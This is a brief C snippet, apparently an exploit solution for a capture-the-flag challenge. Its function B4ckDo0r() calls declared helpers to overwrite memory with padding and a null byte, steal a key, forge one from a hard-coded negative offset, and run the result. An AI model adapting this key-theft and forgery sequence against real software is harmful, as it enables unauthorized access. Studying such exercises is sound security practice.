void save(char* m, char* n);
void takeaway(char* m);
void stealkey();
void fakekey(long long m);
void run();

void B4ckDo0r() {

	save("AAAAAAA1", "BBBBBBBB");
	save("\x00", "BBBBBBBB");
	stealkey();
	fakekey(-0x1090f2);
	run();
}
